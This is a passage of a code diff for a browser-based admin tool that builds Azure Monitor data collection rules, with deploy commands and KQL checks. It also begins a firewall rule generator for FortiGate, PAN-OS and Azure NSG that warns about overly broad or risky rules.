+        <div class="w-head"><div><h2>DCR builder</h2><p>Build a data collection rule for the Azure Monitor Agent: Windows Security events, event logs with XPath, forwarded events, Syslog, CEF and custom text logs. Get deployable JSON, the deploy commands and a query to check data arrives.</p></div></div>
+        <div class="w-sec">
+          <h3>Basics</h3>
+          <div class="plan-grid inputs" style="margin:0;padding:0;border:0">
+            <div class="field"><label>DCR name</label><input class="inp" data-v="name" value="${esc(st.name)}" spellcheck="false"/></div>
+            <div class="field"><label>Region</label><input class="inp" data-v="location" value="${esc(st.location)}" spellcheck="false"/></div>
+            <div class="field"><label>Workspace resource ID</label><input class="inp" data-v="ws" spellcheck="false" placeholder="/subscriptions/…/workspaces/law-soc"/></div>
+            <div class="field" style="grid-column:1/-1"><label>DCE resource ID <span class="cm">(optional; needed for private link and text logs)</span></label><input class="inp" data-v="dce" spellcheck="false" placeholder="/subscriptions/…/dataCollectionEndpoints/dce-soc"/></div>
+          </div>
+        </div>
+        <div class="w-sec">
+          <h3>Data sources</h3>
+          <div class="src-list">
+            ${card('sec', 'Windows Security events', 'What the Sentinel "Windows Security Events via AMA" connector collects', 'SecurityEvent', `
+              <div class="field"><label>Event set</label><span class="seg" data-seg="sec.preset">${[['minimal', 'Minimal (Sentinel)'], ['all', 'All events'], ['custom', 'Custom IDs']].map(([v, l]) => `<button data-sv="${v}" aria-pressed="${st.sec.preset === v}">${l}</button>`).join('')}</span></div>
+              <div class="field" data-when="sec.custom"><label>Event IDs <span class="cm">(commas, ranges like 4720-4740)</span></label><input class="inp" data-v="sec.ids" value="${esc(st.sec.ids)}" spellcheck="false"/></div>
+              <label class="chk" data-when="sec.notall"><input type="checkbox" data-b="sec.applocker" ${st.sec.applocker ? 'checked' : ''}/> Include AppLocker events (8001-8007)</label>
+              ${tf('sec')}`)}
+            ${card('evt', 'Windows event logs', 'System, Application and any other channel, filtered by level or ID', 'Event', `
+              <div class="field"><label>System levels</label><div class="chk-row">${chkList('evt.system', WIN_LEVELS, st.evt.system)}</div></div>
+              <div class="field"><label>Application levels</label><div class="chk-row">${chkList('evt.application', WIN_LEVELS, st.evt.application)}</div></div>
+              <label class="chk"><input type="checkbox" data-b="evt.customOn" ${st.evt.customOn ? 'checked' : ''}/> Add another channel</label>
+              <div class="grid2" data-when="evt.custom"><div class="field"><label>Channel</label><input class="inp" data-v="evt.custom" value="${esc(st.evt.custom)}" spellcheck="false"/></div><div class="field"><label>Event IDs <span class="cm">(blank = all)</span></label><input class="inp" data-v="evt.customIds" spellcheck="false" placeholder="1, 3, 11"/></div></div>
+              ${tf('evt')}`)}
+            ${card('fwd', 'Windows Forwarded Events', 'Events collected by a Windows Event Collector (WEF)', 'WindowsEvent', tf('fwd'))}
+            ${card('sys', 'Syslog', 'Linux system logs, or plain syslog from appliances via a forwarder', 'Syslog', `
+              <div class="field"><label>Facilities</label><div class="chk-row">${facOpts('sys.fac', st.sys.fac)}</div></div>
+              <div class="field"><label>Minimum level</label>${lvlSel('sys.min', st.sys.min)}</div>
+              <label class="chk"><input type="checkbox" data-b="sys.filterCef" ${st.sys.filterCef ? 'checked' : ''}/> Filter CEF messages out of Syslog (avoids duplicates)</label>
+              ${tf('sys')}`)}
+            ${card('cef', 'CEF', 'FortiGate, Palo Alto and other appliances via a Linux forwarder', 'CommonSecurityLog', `
+              <div class="field"><label>Facilities <span class="cm">(the facility your firewalls send CEF on)</span></label><div class="chk-row">${facOpts('cef.fac', st.cef.fac)}</div></div>
+              <div class="field"><label>Minimum level</label>${lvlSel('cef.min', st.cef.min)}</div>
+              ${tf('cef')}`)}
+            ${card('txt', 'Custom text log', 'Any application log file on the machine', 'Custom _CL table', `
+              <div class="field"><label>OS</label><span class="seg" data-seg="txt.os"><button data-sv="windows" aria-pressed="${st.txt.os === 'windows'}">Windows</button><button data-sv="linux" aria-pressed="${st.txt.os === 'linux'}">Linux</button></span></div>
+              <div class="grid2"><div class="field"><label>File pattern</label><input class="inp" data-v="txt.pattern" value="${esc(st.txt.pattern)}" spellcheck="false"/></div>
+              <div class="field"><label>Table name <span class="cm">(_CL is added)</span></label><input class="inp" data-v="txt.table" value="${esc(st.txt.table)}" spellcheck="false"/></div></div>
+              <div class="grid2"><div class="field"><label>Timestamp format</label><select data-v="txt.time">${TIME_FORMATS.map(t => `<option ${t === st.txt.time ? 'selected' : ''}>${esc(t)}</option>`).join('')}</select></div>
+              <div class="field"><label>Delimiter <span class="cm">(blank = keep RawData)</span></label><input class="inp" data-v="txt.delim" spellcheck="false" placeholder=","/></div></div>
+              <div class="field" data-when="txt.delim"><label>Columns in order <span class="cm">(name:type)</span></label><input class="inp" data-v="txt.cols" value="${esc(st.txt.cols)}" spellcheck="false"/></div>`)}
+          </div>
+        </div>
+        <div id="dcrOut"></div>`;
+
+      const out = $('#dcrOut', w);
+      const get = p => p.split('.').reduce((o, k) => o[k], st);
+      const set = (p, v) => { const k = p.split('.'); const last = k.pop(); k.reduce((o, x) => o[x], st)[last] = v; };
+
+      function build() {
+        const warn = [], info = [];
+        const wsId = st.ws.trim() || '/subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.OperationalInsights/workspaces/<workspace>';
+        const dest = 'logAnalyticsDest';
+        const ds = {}, flows = [], streamsDecl = {}, tables = [];
+        const tfm = t => (t || '').trim() || 'source';
+        const flow = (stream, out, t) => flows.push({ streams: [stream], destinations: [dest], transformKql: tfm(t), outputStream: out });
+        let winSrc = false, linSrc = false, xpathCount = 0;
+
+        if (st.sec.on) {
+          winSrc = true;
+          let q = [];
+          if (st.sec.preset === 'all') q = ['Security!*'];
+          else {
+            const ids = st.sec.preset === 'minimal' ? SEC_MINIMAL : parseIds(st.sec.ids).ids;
+            if (st.sec.preset === 'custom') { const b = parseIds(st.sec.ids).bad; if (b.length) warn.push(`Ignored invalid event IDs: <code>${b.map(esc).join(', ')}</code>`); if (!ids.length) warn.push('Custom set has no event IDs, so this collects the whole Security log.'); }
+            q = xpaths('Security', ids);
+          }
+          if (st.sec.applocker || st.sec.preset === 'all') {
+            if (st.sec.preset === 'all') q.push('Microsoft-Windows-AppLocker/EXE and DLL!*', 'Microsoft-Windows-AppLocker/MSI and Script!*');
+            else q.push(...xpaths('Microsoft-Windows-AppLocker/EXE and DLL', [8001, 8002, 8003, 8004]), ...xpaths('Microsoft-Windows-AppLocker/MSI and Script', [8005, 8006, 8007]));
+          }
+          xpathCount += q.length;
+          (ds.windowsEventLogs ||= []).push({ name: 'securityEvents', streams: ['Microsoft-SecurityEvent'], xPathQueries: q });
+          flow('Microsoft-SecurityEvent', 'Microsoft-SecurityEvent', st.sec.transform); tables.push('SecurityEvent');
+          if (st.sec.preset === 'minimal') info.push('Minimal set taken from Microsoft\'s Sentinel event ID reference. The official set also lists AppLocker event 8222.');
+        }
+        if (st.evt.on) {
+          winSrc = true;
+          const q = [];
+          if (st.evt.system.length) q.push(...xpaths('System', [], levelClauseOf(st.evt.system)));
+          if (st.evt.application.length) q.push(...xpaths('Application', [], levelClauseOf(st.evt.application)));
+          if (st.evt.customOn && st.evt.custom.trim()) q.push(...xpaths(st.evt.custom.trim(), parseIds(st.evt.customIds).ids));
+          if (!q.length) warn.push('Windows event logs is on but no channel or level is selected.');
+          else { xpathCount += q.length; (ds.windowsEventLogs ||= []).push({ name: 'eventLogs', streams: ['Microsoft-Event'], xPathQueries: q }); flow('Microsoft-Event', 'Microsoft-Event', st.evt.transform); tables.push('Event'); }
+          if (st.evt.customOn && /sysmon/i.test(st.evt.custom)) info.push('Sysmon lands in the <b>Event</b> table with the details in <code>EventData</code> XML. Parse it with a function or the ASIM parsers.');
+        }
+        if (st.fwd.on) {
+          winSrc = true; xpathCount++;
+          (ds.windowsEventLogs ||= []).push({ name: 'forwardedEvents', streams: ['Microsoft-WindowsEvent'], xPathQueries: ['ForwardedEvents!*'] });
+          flow('Microsoft-WindowsEvent', 'Microsoft-WindowsEvent', st.fwd.transform); tables.push('WindowsEvent');
+          info.push('Forwarded events go to <b>WindowsEvent</b>, not SecurityEvent. Many built-in Sentinel rules query SecurityEvent, so check the rules you rely on.');
+        }
+        const lvAbove = min => LEVELS.slice(LEVELS.indexOf(min));
+        if (st.sys.on) {
+          linSrc = true;
+          if (!st.sys.fac.length) warn.push('Syslog is on but no facility is selected.');
+          else {
+            (ds.syslog ||= []).push({ name: 'sysLogsDataSource', streams: ['Microsoft-Syslog'], facilityNames: st.sys.fac, logLevels: lvAbove(st.sys.min) });
+            let t = tfm(st.sys.transform);
+            if (st.sys.filterCef && st.cef.on) t = (t === 'source' ? 'source' : t) + ' | where ProcessName !contains "CEF" and SyslogMessage !contains "CEF:0"';
+            flow('Microsoft-Syslog', 'Microsoft-Syslog', t); tables.push('Syslog');
+          }
+        }
+        if (st.cef.on) {
+          linSrc = true;
+          if (!st.cef.fac.length) warn.push('CEF is on but no facility is selected.');
+          else { (ds.syslog ||= []).push({ name: 'cefDataSource', streams: ['Microsoft-CommonSecurityLog'], facilityNames: st.cef.fac, logLevels: lvAbove(st.cef.min) }); flow('Microsoft-CommonSecurityLog', 'Microsoft-CommonSecurityLog', st.cef.transform); tables.push('CommonSecurityLog'); }
+          const overlap = st.sys.on ? st.cef.fac.filter(f => st.sys.fac.includes(f)) : [];
+          if (overlap.length && !st.sys.filterCef) warn.push(`Facility <code>${overlap.join(', ')}</code> is used by both Syslog and CEF, so CEF messages will be ingested twice (Syslog and CommonSecurityLog). Use separate facilities, or tick "Filter CEF messages out of Syslog".`);
+          else if (overlap.length) info.push(`Facility <code>${overlap.join(', ')}</code> is shared by Syslog and CEF. The Syslog flow filters CEF out to prevent duplicates.`);
+          info.push('After the DCR, run the Sentinel forwarder installation script on the Linux machine so rsyslog / syslog-ng listens on 514.');
+        }
+        let txtTable = '';
+        if (st.txt.on) {
+          (st.txt.os === 'windows' ? (winSrc = true) : (linSrc = true));
+          const base = (st.txt.table.trim() || 'MyApp').replace(/_CL$/i, '').replace(/[^A-Za-z0-9_]/g, '');
+          txtTable = base + '_CL';
+          const sName = `Custom-Text-${base}`;
+          streamsDecl[sName] = { columns: [{ name: 'TimeGenerated', type: 'datetime' }, { name: 'RawData', type: 'string' }, { name: 'FilePath', type: 'string' }, { name: 'Computer', type: 'string' }] };
+          const pats = st.txt.pattern.split(',').map(s => s.trim()).filter(Boolean);
+          (ds.logFiles ||= []).push({ name: `${base}-${st.txt.os}`, streams: [sName], filePatterns: pats.length ? pats : ['<path>'], format: 'text', settings: { text: { recordStartTimestampFormat: st.txt.time } } });
+          let t = 'source', cols = [];
+          if (st.txt.delim) {
+            cols = st.txt.cols.split(',').map(c => c.trim()).filter(Boolean).map(c => { const [n, ty] = c.split(':').map(x => x.trim()); return { n: n.replace(/[^A-Za-z0-9_]/g, ''), ty: (ty || 'string').toLowerCase() }; }).filter(c => c.n);
+            const conv = { datetime: 'todatetime', int: 'toint', long: 'tolong', real: 'toreal', bool: 'tobool', boolean: 'tobool', dynamic: 'todynamic', string: 'tostring' };
+            const d = st.txt.delim === '\\t' ? '\\t' : st.txt.delim.replace(/"/g, '\\"');
+            t = `source | extend d = split(RawData, "${d}") | project ${cols.map((c, i) => `${/^time/i.test(c.n) && c.ty === 'datetime' ? 'TimeGenerated' : c.n} = ${conv[c.ty] || 'tostring'}(d[${i}])`).join(', ')}, Computer, FilePath`;
+          }
+          flow(sName, `Custom-${txtTable}`, t); tables.push(txtTable);
+          if (!st.dce.trim()) warn.push('Custom text logs: Microsoft\'s sample DCR includes a <b>DCE</b>. Add a DCE resource ID.');
+          warn.push(`Create the <b>${esc(txtTable)}</b> table first (script below). The DCR deploy fails if the table or its columns don't exist.`);
+          if (pats.some(p => (st.txt.os === 'windows') !== /^[A-Za-z]:\\|^\\\\/.test(p))) warn.push(`File pattern doesn't look like a ${st.txt.os === 'windows' ? 'Windows' : 'Linux'} path.`);
+          st._txtCols = cols;
+        }
+        if (!flows.length) warn.push('Turn on at least one data source.');
+        if (xpathCount && st.sec.preset !== 'all') info.push(`XPath queries are split to stay within the DCR limit of <b>20 expressions</b> per query, and consecutive IDs are merged into ranges.`);
+        if (!st.ws.trim()) warn.push('Add the workspace resource ID; a placeholder is used for now.');
+
+        const props = {};
+        if (st.dce.trim()) props.dataCollectionEndpointId = st.dce.trim();
+        if (Object.keys(streamsDecl).length) props.streamDeclarations = streamsDecl;
+        props.dataSources = ds;
+        props.destinations = { logAnalytics: [{ workspaceResourceId: wsId, name: dest }] };
+        props.dataFlows = flows;
+        const dcr = { location: st.location.trim().toLowerCase().replace(/\s+/g, '') || 'qatarcentral' };
+        if (winSrc && !linSrc) dcr.kind = 'Windows'; else if (linSrc && !winSrc) dcr.kind = 'Linux';
+        if (winSrc && linSrc) info.push('This DCR mixes Windows and Linux sources, so <code>kind</code> is left out. Each agent only picks up the sources for its OS.');
+        dcr.properties = props;
+        return { dcr, warn, info, tables, txtTable, kind: dcr.kind };
+      }
+
+      function jsonHlDcr(s) {
+        return esc(s)
+          .replace(/(&quot;[^&]*?&quot;)(\s*:)/g, '<span class="key">$1</span>$2')
+          .replace(/(:\s*|\[\s*|,\s*)(&quot;.*?&quot;)(?=\s*[,\]\n}])/g, '$1<span class="s">$2</span>');
+      }
+
+      function run() {
+        w.querySelectorAll('[data-card]').forEach(c => c.classList.toggle('on', st[c.dataset.card].on));
+        const show = { 'sec.custom': st.sec.preset === 'custom', 'sec.notall': st.sec.preset !== 'all', 'evt.custom': st.evt.customOn, 'txt.delim': !!st.txt.delim };
+        w.querySelectorAll('[data-when]').forEach(el => el.style.display = show[el.dataset.when] ? '' : 'none');
+        const r = build();
+        const json = JSON.stringify(r.dcr, null, 2);
+        const name = st.name.trim() || 'my-dcr';
+        const loc = r.dcr.location;
+        const deploy = `# Azure CLI\naz monitor data-collection rule create \\\n  --name "${name}" --resource-group "<rg>" --location "${loc}" \\\n  --rule-file "./${name}.json"\n\n# Associate with a machine (Azure VM or Arc server)\naz monitor data-collection rule association create \\\n  --name "${name}-assoc" \\\n  --rule-id "/subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.Insights/dataCollectionRules/${name}" \\\n  --resource "<vm-or-arc-machine-resource-id>"${st.dce.trim() ? `\n\n# With private link, also associate the configuration DCE\naz monitor data-collection rule association create \\\n  --name configurationAccessEndpoint \\\n  --endpoint-id "${st.dce.trim()}" \\\n  --resource "<vm-or-arc-machine-resource-id>"` : ''}\n\n# PowerShell alternative\nNew-AzDataCollectionRule -Name "${name}" -ResourceGroupName "<rg>" -JsonFilePath "./${name}.json"`;
+        let tableScript = '';
+        if (r.txtTable) {
+          const extra = (st._txtCols || []).filter(c => !(/^time/i.test(c.n) && c.ty === 'datetime')).map(c => ({ name: c.n, type: c.ty === 'int' ? 'int' : c.ty }));
+          const cols = [{ name: 'TimeGenerated', type: 'datetime' }, { name: 'Computer', type: 'string' }, { name: 'FilePath', type: 'string' }, ...(st.txt.delim ? extra : [{ name: 'RawData', type: 'string' }])];
+          tableScript = `$tableParams = @'\n${JSON.stringify({ properties: { schema: { name: r.txtTable, columns: cols } } }, null, 2)}\n'@\n\nInvoke-AzRestMethod -Method PUT -Payload $tableParams -Path "/subscriptions/<sub-id>/resourcegroups/<rg>/providers/microsoft.operationalinsights/workspaces/<workspace>/tables/${r.txtTable}?api-version=2022-10-01"`;
+        }
+        const verify = r.tables.map(t => `${t}\n| where TimeGenerated > ago(30m)\n| summarize Events = count(), LastSeen = max(TimeGenerated) by Computer`).join('\n\n') + (r.tables.length ? '\n\n// agent is alive?\nHeartbeat\n| where TimeGenerated > ago(15m)\n| summarize LastHeartbeat = max(TimeGenerated) by Computer, Category' : '');
+        out.innerHTML = `
+          <div class="w-sec">
+            <div class="summary">${r.kind ? `<span class="pill b">kind: ${r.kind}</span>` : '<span class="pill">kind: mixed</span>'}${r.tables.map(t => `<span class="pill g">→ ${esc(t)}</span>`).join('')}${st.dce.trim() ? '<span class="pill">DCE set</span>' : ''}</div>
+            ${r.warn.length ? `<ul class="gotchas">${r.warn.map(x => `<li><span>${x}</span></li>`).join('')}</ul>` : ''}
+            ${r.info.length ? `<ul class="notes">${r.info.map(x => `<li><span>${x}</span></li>`).join('')}</ul>` : ''}
+          </div>
+          <div class="w-sec">
+            <h3><span>DCR JSON</span><span class="row-actions"><button class="btn sm" data-copy="${esc(json)}" data-label="DCR JSON">Copy</button><button class="btn sm solid" id="dcrDl">Download ${esc(name)}.json</button></span></h3>
+            <pre class="code" style="max-height:460px">${jsonHlDcr(json)}</pre>
+          </div>
+          ${tableScript ? `<div class="w-sec"><h3><span>Create the custom table first</span><span class="row-actions"><button class="btn sm" data-copy="${esc(tableScript)}" data-label="table script">Copy</button></span></h3><pre class="code">${esc(tableScript)}</pre></div>` : ''}
+          <div class="w-sec"><h3><span>Deploy and associate</span><span class="row-actions"><button class="btn sm" data-copy="${esc(deploy)}" data-label="deploy commands">Copy</button></span></h3><pre class="code">${esc(deploy)}</pre></div>
+          ${r.tables.length ? kqlBlock(verify) : ''}
+          <div class="w-sec"><p class="hint-line" style="margin:0">Based on Microsoft Learn DCR samples and structure, Windows events XPath guidance, text log collection, and the Sentinel CEF/Syslog via AMA docs.</p></div>`;
+        $('#dcrDl', out).onclick = () => {
+          const a = document.createElement('a');
+          a.href = URL.createObjectURL(new Blob([json], { type: 'application/json' }));
+          a.download = `${name}.json`; document.body.appendChild(a); a.click();
+          setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 500);
+        };
+      }
+
+      w.addEventListener('change', e => {
+        const t = e.target;
+        if (t.dataset.on) { st[t.dataset.on].on = t.checked; return run(); }
+        if (t.dataset.b) { set(t.dataset.b, t.checked); return run(); }
+        if (t.dataset.arr) { const arr = get(t.dataset.arr); const i = arr.indexOf(t.value); if (t.checked && i < 0) arr.push(t.value); if (!t.checked && i > -1) arr.splice(i, 1); return run(); }
+        if (t.tagName === 'SELECT' && t.dataset.v) { set(t.dataset.v, t.value); return run(); }
+      });
+      w.addEventListener('input', e => { const t = e.target; if (t.dataset.v && t.tagName === 'INPUT') { set(t.dataset.v, t.value); run(); } });
+      w.addEventListener('click', e => {
+        const b = e.target.closest('[data-seg] button'); if (!b) return;
+        const seg = b.parentElement; set(seg.dataset.seg, b.dataset.sv);
+        seg.querySelectorAll('button').forEach(x => x.setAttribute('aria-pressed', x === b));
+        run();
+      });
+      run();
+    }
+
+    /* =========================================================
+       Firewall rule builder: FortiGate CLI, PAN-OS set commands, Azure NSG
+       ========================================================= */
+    const FGT_SVC = { 'tcp/443': 'HTTPS', 'tcp/80': 'HTTP', 'tcp/22': 'SSH', 'tcp/3389': 'RDP' };
+    const PAN_SVC = { 'tcp/443': 'service-https', 'tcp/80': 'service-http' };
+    const PAN_APP = { 'tcp/443': 'ssl', 'tcp/80': 'web-browsing', 'tcp/22': 'ssh', 'tcp/3389': 'ms-rdp', 'udp/53': 'dns', 'tcp/53': 'dns', 'udp/514': 'syslog', 'tcp/514': 'syslog', 'udp/123': 'ntp', 'tcp/389': 'ldap', 'tcp/636': 'ldap', 'tcp/88': 'kerberos', 'udp/88': 'kerberos', 'tcp/445': 'ms-ds-smb', 'tcp/25': 'smtp', 'icmp': 'icmp' };
+    const RISKY_PORTS = { 22: 'SSH', 23: 'Telnet', 445: 'SMB', 3389: 'RDP', 1433: 'MSSQL', 3306: 'MySQL', 5985: 'WinRM', 5986: 'WinRM' };
+
+    function parseAddr(tok) {
+      const t = tok.trim(); if (!t) return null;
+      if (/^any$/i.test(t)) return { kind: 'any', raw: t };
+      let m;
+      if ((m = t.match(/^(\d{1,3}(?:\.\d{1,3}){3})-(\d{1,3}(?:\.\d{1,3}){3})$/))) {
+        const a = ipToInt(m[1]), b = ipToInt(m[2]); if (a === null || b === null || b < a) return { kind: 'bad', raw: t };
+        return { kind: 'range', raw: t, a: m[1], b: m[2], name: `R-${m[1]}-${m[2]}` };
+      }
+      if ((m = t.match(/^(\d{1,3}(?:\.\d{1,3}){3})(?:\/(\d{1,2}))?$/))) {
+        const ip = ipToInt(m[1]), p = m[2] === undefined ? 32 : +m[2];
+        if (ip === null || p > 32) return { kind: 'bad', raw: t };
+        const mask = p === 0 ? 0 : (0xFFFFFFFF << (32 - p)) >>> 0, net = (ip & mask) >>> 0;
+        return { kind: p === 32 ? 'host' : 'net', raw: t, ip: intToIp(net), p, mask: intToIp(mask), fixed: net !== ip, name: p === 32 ? `H-${intToIp(net)}` : `N-${intToIp(net)}_${p}` };
+      }
+      if (/^(?=.*[a-z])[a-z0-9*]([a-z0-9-*]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$/i.test(t)) return { kind: 'fqdn', raw: t, name: `FQDN-${t}`.slice(0, 63) };
+      if (/^[A-Za-z][A-Za-z0-9.]*$/.test(t)) return { kind: 'tag', raw: t };
+      return { kind: 'bad', raw: t };
+    }
+    function parseSvc(tok) {
+      const t = tok.trim().toLowerCase(); if (!t) return null;
+      if (t === 'any') return { kind: 'any', raw: t };
+      if (t === 'icmp' || t === 'ping') return { kind: 'icmp', raw: t, key: 'icmp' };
+      const m = t.match(/^(tcp|udp)[\/:\s]?(\d{1,5})(?:-(\d{1,5}))?$/) || t.match(/^(\d{1,5})(?:-(\d{1,5}))?\/(tcp|udp)$/);
+      if (!m) return { kind: 'bad', raw: tok.trim() };
+      let proto, a, b;
+      if (/^(tcp|udp)$/.test(m[1])) { proto = m[1]; a = +m[2]; b = m[3] ? +m[3] : a; } else { proto = m[3]; a = +m[1]; b = m[2] ? +m[2] : a; }
+      if (a < 1 || b > 65535 || b < a) return { kind: 'bad', raw: tok.trim() };
+      const port = a === b ? `${a}` : `${a}-${b}`;
+      return { kind: 'port', raw: t, proto, a, b, port, key: `${proto}/${port}`, name: `${proto.toUpperCase()}-${port}` };
+    }
+
+    function renderFw(w) {
+      const st = {
+        name: 'Allow-Web-Inbound', desc: 'Public access to the web server', action: 'allow',
+        src: 'any', dst: '10.10.30.15', svc: 'tcp/443, tcp/80',
+        log: true, nat: false, sec: true,
+        fgtIn: 'wan1', fgtOut: 'internal', panFrom: 'untrust', panTo: 'dmz', appid: true, panLog: 'to-sentinel', panProfile: 'default', panDg: '',
+        nsgDir: 'Inbound', nsgPrio: '200', nsgName: 'nsg-web', nsgRg: 'rg-network'
+      };
+      const SAMPLES = {
+        'Web inbound': { name: 'Allow-Web-Inbound', desc: 'Public access to the web server', action: 'allow', src: 'any', dst: '10.10.30.15', svc: 'tcp/443, tcp/80', fgtIn: 'wan1', fgtOut: 'dmz', panFrom: 'untrust', panTo: 'dmz', nsgDir: 'Inbound', nat: false },
+        'Syslog to Sentinel forwarder': { name: 'Allow-Syslog-To-Forwarder', desc: 'Firewalls send CEF to the AMA forwarder', action: 'allow', src: '10.10.0.1, 10.20.0.1', dst: '10.10.40.10', svc: 'udp/514, tcp/514', fgtIn: 'internal', fgtOut: 'servers', panFrom: 'trust', panTo: 'servers', nsgDir: 'Inbound', nat: false },
+        'Block RDP from internet': { name: 'Deny-RDP-From-Internet', desc: 'Explicitly block inbound RDP', action: 'deny', src: 'any', dst: '10.10.0.0/16', svc: 'tcp/3389', fgtIn: 'wan1', fgtOut: 'internal', panFrom: 'untrust', panTo: 'trust', nsgDir: 'Inbound', nat: false },
+        'Outbound to Azure Monitor': { name: 'Allow-AMA-Outbound', desc: 'AMA agents to Azure Monitor', action: 'allow', src: '10.10.40.0/24', dst: 'global.handler.control.monitor.azure.com, qatarcentral.handler.control.monitor.azure.com', svc: 'tcp/443', fgtIn: 'servers', fgtOut: 'wan1', panFrom: 'servers', panTo: 'untrust', nsgDir: 'Outbound', nat: true }
+      };
+      const inp = (k, label, ph = '', full = false) => `<div class="field"${full ? ' style="grid-column:1/-1"' : ''}><label>${label}</label><input class="inp" data-k="${k}" value="${esc(st[k])}" placeholder="${esc(ph)}" spellcheck="false"/></div>`;
+      const tick = (k, label) => `<label class="chk"><input type="checkbox" data-kb="${k}" ${st[k] ? 'checked' : ''}/> ${label}</label>`;
+
+      w.innerHTML = `
+        <div class="w-head"><div><h2>Firewall rule builder</h2><p>Describe a rule once. Get FortiGate CLI, PAN-OS set commands and an Azure NSG rule side by side, with the address and service objects, a test command for each, and a check for risky rules.</p></div></div>
+        <div class="w-sec">
+          <h3><span>Rule</span><span class="row-actions">${Object.keys(SAMPLES).map(k => `<button class="btn sm" data-fs="${esc(k)}">${esc(k)}</button>`).join('')}</span></h3>
+          <div class="plan-grid inputs" style="margin:0;padding:0;border:0" id="fwMain">
+            ${inp('name', 'Rule name')}
+            <div class="field"><label>Action</label><span class="seg" data-fk="action"><button data-fv="allow" aria-pressed="true">Allow</button><button data-fv="deny" aria-pressed="false">Deny</button></span></div>
+            ${inp('desc', 'Description')}
+            ${inp('src', 'Source <span class="cm">(IP, CIDR, range, FQDN or any)</span>', 'any')}
+            ${inp('dst', 'Destination', '10.10.30.15')}
+            ${inp('svc', 'Services <span class="cm">(tcp/443, udp/514, tcp/8000-8080, icmp, any)</span>', 'tcp/443')}
+          </div>
+          <div class="chk-row" style="margin-top:14px">${tick('log', 'Log traffic')}${tick('sec', 'Apply security profiles')}${tick('nat', 'Source NAT (outbound)')}</div>
+        </div>
+        <div class="w-sec">
+          <h3>Vendor details</h3>
+          <div class="vendor-grid">
+            <div class="vendor"><h4>FortiGate</h4>${inp('fgtIn', 'Source interface')}${inp('fgtOut', 'Destination interface')}</div>
+            <div class="vendor"><h4>Palo Alto</h4>${inp('panFrom', 'From zone')}${inp('panTo', 'To zone')}${inp('panLog', 'Log forwarding profile')}${inp('panProfile', 'Security profile group')}${inp('panDg', 'Panorama device group <span class="cm">(blank = firewall)</span>')}${tick('appid', 'Use App-ID (application-default)')}</div>
+            <div class="vendor"><h4>Azure NSG</h4><div class="field"><label>Direction</label><span class="seg" data-fk="nsgDir"><button data-fv="Inbound" aria-pressed="true">Inbound</button><button data-fv="Outbound" aria-pressed="false">Outbound</button></span></div>${inp('nsgPrio', 'Priority (100-4096)')}${inp('nsgName', 'NSG name')}${inp('nsgRg', 'Resource group')}</div>
+          </div>
+        </div>
+        <div id="fwOut"></div>`;
+
+      const out = $('#fwOut', w);
+      const q = s => /[\s"]/.test(s) ? `"${s.replace(/"/g, '\\"')}"` : s;
+
+      function build() {
+        const lint = [], errs = [];
+        const parseList = (s, fn) => s.split(/[,\n]+/).map(fn).filter(Boolean);
+        const src = parseList(st.src, parseAddr), dst = parseList(st.dst, parseAddr), svc = parseList(st.svc, parseSvc);
+        [...src, ...dst].filter(a => a.kind === 'bad').forEach(a => errs.push(`Can't read address <code>${esc(a.raw)}</code>.`));
+        svc.filter(s => s.kind === 'bad').forEach(s => errs.push(`Can't read service <code>${esc(s.raw)}</code>. Use tcp/443, udp/514, tcp/8000-8080, icmp or any.`));
+        [...src, ...dst].filter(a => a.fixed).forEach(a => lint.push(`<code>${esc(a.raw)}</code> has host bits set; normalised to <code>${a.ip}/${a.p}</code>.`));
+        const tags = [...src, ...dst].filter(a => a.kind === 'tag');
+        const name = (st.name.trim() || 'New-Rule').replace(/[^A-Za-z0-9_.\- ]/g, '').slice(0, 63);
+        const allow = st.action === 'allow';
+        const srcAny = !src.length || src.some(a => a.kind === 'any'), dstAny = !dst.length || dst.some(a => a.kind === 'any'), svcAny = !svc.length || svc.some(s => s.kind === 'any');
+        const objs = arr => arr.filter(a => ['host', 'net', 'range', 'fqdn'].includes(a.kind));
+        const ports = svc.filter(s => s.kind === 'port');
+
+        // lint
+        if (allow && srcAny && dstAny && svcAny) lint.unshift('<b>Any / any / any allow.</b> This rule permits everything. Narrow at least one of source, destination or service.');
+        else if (allow && srcAny && svcAny) lint.push('<b>Any source to any service.</b> Very broad for an allow rule.');
+        if (allow && srcAny) ports.forEach(p => { for (const [pt, n] of Object.entries(RISKY_PORTS)) if (+pt >= p.a && +pt <= p.b) lint.push(`<b>${n} (${pt}) open to any source.</b> Restrict the source, or put it behind VPN or a bastion.`); });
+        if (!st.log) lint.push('Logging is off. Without logs this rule is invisible to Sentinel and to troubleshooting.');
+        if (!allow) lint.push('Deny rules only work <b>above</b> the allow rules they need to beat. Check the rule order after adding it.');
+        if (st.nat && st.nsgDir === 'Inbound') lint.push('Source NAT is usually for outbound traffic. Check that this inbound rule really needs it.');
+        if (tags.length) lint.push(`<code>${tags.map(t => esc(t.raw)).join(', ')}</code> looks like an Azure service tag. It's used as-is in the NSG and skipped on FortiGate and PAN-OS.`);
+
+        // FortiGate
+        const fgt = [];
+        const fAddr = objs([...src, ...dst]).filter((a, i, arr) => arr.findIndex(x => x.name === a.name) === i);
+        if (fAddr.length) {
+          fgt.push('config firewall address');
+          fAddr.forEach(a => {
+            fgt.push(`    edit "${a.name}"`);
+            if (a.kind === 'host' || a.kind === 'net') fgt.push(`        set subnet ${a.ip} ${a.mask}`);
+            if (a.kind === 'range') fgt.push('        set type iprange', `        set start-ip ${a.a}`, `        set end-ip ${a.b}`);
+            if (a.kind === 'fqdn') fgt.push('        set type fqdn', `        set fqdn "${a.raw}"`);
+            fgt.push('    next');
+          });
+          fgt.push('end');
+        }
+        const fCustom = ports.filter(p => !FGT_SVC[p.key]).filter((p, i, arr) => arr.findIndex(x => x.name === p.name) === i);
+        if (fCustom.length) {
+          fgt.push('config firewall service custom');
+          fCustom.forEach(p => fgt.push(`    edit "${p.name}"`, `        set ${p.proto}-portrange ${p.port}`, '    next'));
+          fgt.push('end');
+        }
+        const fNames = arr => arr.some(a => a.kind === 'any') || !objs(arr).length ? '"all"' : objs(arr).map(a => `"${a.name}"`).join(' ');
+        const fSvc = svcAny ? '"ALL"' : [...ports.map(p => `"${FGT_SVC[p.key] || p.name}"`), ...(svc.some(s => s.kind === 'icmp') ? ['"ALL_ICMP"'] : [])].join(' ');
